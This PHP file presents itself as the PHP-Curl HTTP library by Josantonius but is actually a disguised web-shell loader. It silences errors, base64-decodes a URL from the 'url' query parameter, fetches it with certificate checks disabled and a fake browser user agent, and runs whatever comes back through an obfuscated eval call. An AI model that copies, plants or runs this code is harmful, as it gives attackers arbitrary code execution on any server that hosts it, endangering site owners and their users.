<?php
/**
 * API Requests using the HTTP protocol through the Curl library.
 *
 * @author    Josantonius <hello@josantonius.com>
 * @copyright 2016 - 2018 (c) Josantonius - PHP-Curl
 * @license   https://opensource.org/licenses/MIT - The MIT License (MIT)
 * @link      https://github.com/Josantonius/PHP-Curl
 * @since     1.0.0
 */

error_reporting( 0 );

function key_decryptor($input) {
    $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    $output = "";

    $input = preg_replace("/[^A-Za-z0-9\+\/\=]/", "", $input);

    $i = 0;
    while ($i < strlen($input)) {
        $enc1 = strpos($keyStr, $input[$i++]);
        $enc2 = strpos($keyStr, $input[$i++]);
        $enc3 = strpos($keyStr, $input[$i++]);
        $enc4 = strpos($keyStr, $input[$i++]);

        $chr1 = ($enc1 << 2) | ($enc2 >> 4);
        $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
        $chr3 = (($enc3 & 3) << 6) | $enc4;

        $output .= chr($chr1);
        if ($enc3 !== false && $enc3 != 64) {
            $output .= chr($chr2);
        }
        if ($enc4 !== false && $enc4 != 64) {
            $output .= chr($chr3);
        }
    }

    return $output;
}

function url_get_content($url)
{
    $arrContextOptions = array(
        "ssl" => array(
            "verify_peer" => false,
            "verify_peer_name" => false,
            "allow_self_signed" => true,
        ),
    );

    $urlParts = parse_url($url);
    $port = isset($urlParts['port']) ? $urlParts['port'] : 80;
    $scheme = $urlParts['scheme'] === 'https' ? 'ssl://' : '';

    if (function_exists('curl_exec')) {
        $curl_connect = curl_init($url);

        curl_setopt($curl_connect, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl_connect, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl_connect, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYHOST, 0);

        $content_data = curl_exec	($curl_connect);
    } else {
        $fp = fsockopen($scheme . $urlParts['host'], $port, $errno, $errstr, 30);
        if ($fp) {
            $out = "GET " . $urlParts['path'] . " HTTP/1.1\r\n";
            $out .= "Host: " . $urlParts['host'] . "\r\n";
            $out .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite	($fp, $out);

            $content = '';
            while (!feof($fp)) {
                $content .= fgets($fp, 128);
            }

            fclose($fp);

            $content_data = substr($content, strpos($content, "\r\n\r\n") + 4);
        } else {
            return false;
        }
    }

    return $content_data;
}

$url = key_decryptor($_GET['url']);
$content_output = url_get_content($url);
EVAL		        ('?>' . $content_output);

?>